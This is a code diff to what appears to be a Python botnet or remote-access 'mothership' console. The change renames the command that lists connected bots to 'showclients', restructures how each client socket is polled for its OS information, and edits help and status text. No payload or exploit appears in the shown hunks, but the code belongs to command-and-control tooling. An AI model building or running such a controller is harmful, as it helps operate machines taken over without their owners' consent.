@@ -308,8 +308,11 @@ def mothership():
 		except KeyboardInterrupt:
 			quitsafely()
 
-		if 'showbots' in command:
-			showbots()
+		if 'showclients' in command:
+			x=showclients()
+			while x != 0:
+				x=showclients()
+
 
 
 		elif "connect" in command:
@@ -328,36 +331,37 @@ def mothership():
 			helpmothership()
 
 		else:
-			print("INVALID COMMAND PRESS HELP FOR MORE INFO")
+			print("Invalid Command Press help for more info")
 
-def showbots():
+def showclients():
 
 	bottable.clear_rows()
 	for x in range(len(list_of_clientsocket)):
 		try:
 			list_of_clientsocket[x].send('os'.encode())
 			clientinfo=list_of_clientsocket[x].recv(1024)
-			if clientinfo=='':
+			if not clientinfo:
 				list_of_clientsocket[x].close()
 				remove(list_of_clientsocket[x])
-
-			else:
-				clientinfo=clientinfo.decode()
-				clientinfo=clientinfo.split('$')
-				table=[x,list_of_clientaddr[x][0],list_of_clientaddr[x][1]]
-				table.extend(clientinfo)
-				bottable.add_row(table)
+				return 1
 
 		except:
-			list_of_clientsocket[x].close()
-			remove(list_of_clientsocket[x])
+				list_of_clientsocket[x].close()
+				remove(list_of_clientsocket[x])
+				return 1
 
 
+		clientinfo=clientinfo.decode()
+		clientinfo=clientinfo.split('$')
+		table=[x,list_of_clientaddr[x][0],list_of_clientaddr[x][1]]
+		table.extend(clientinfo)
+		bottable.add_row(table)
 
-	print ("CURRENTLY CONNECTED BOTS")
+
+	print ("CURRENTLY CONNECTED CLIENTS")
 	print ("----------------------------")    
 	print (bottable)
-
+	return 0
 
 def clientstatus(conn,command):
 	conn.send(command.encode())
@@ -546,7 +550,7 @@ def helpmothership():
     print("+----------------+--------------------------------------+")
     print("|     COMMAND    | DESCRIPTION                          |")
     print("+----------------+--------------------------------------+")
-    print("| showbots       | display table of connected bots      |")
+    print("| showclients    | display table of connected clients   |")
     print("+----------------+--------------------------------------+")
     print("| connect <index>| connect to bot at a specified index  |")
     print("+----------------+--------------------------------------+")
